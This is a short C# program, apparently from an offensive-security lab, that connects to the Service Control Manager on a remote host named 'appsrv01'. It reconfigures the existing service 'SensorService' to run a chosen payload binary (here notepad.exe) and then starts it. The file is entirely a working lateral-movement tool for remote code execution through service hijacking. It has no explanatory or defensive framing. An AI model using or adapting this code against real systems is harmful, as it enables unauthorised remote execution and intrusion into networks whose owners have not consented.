using System;
using System.Runtime.InteropServices;

namespace dcom_modservice_exec
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string machineName, 
            string databaseName,
            uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(
            IntPtr hSCManager, 
            string lpServiceName, 
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService, 
            uint dwServiceType,
            int dwStartType, 
            int dwErrorControl,
            string lpBinaryPathName, 
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName, 
            string lpPassword,
            string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService, 
            int dwNumServiceArgs, 
            string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            // Define target
            String target = "appsrv01";
            IntPtr scmHandle = OpenSCManager(target, null, 0xF003F);

            // Open service
            string serviceName = "SensorService";
            IntPtr schService = OpenService(scmHandle, serviceName, 0xF01FF);

            // Modify service binary
            string payload = "notepad.exe";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            // Start service
            bResult = StartService(schService, 0, null);


        }
    }
}
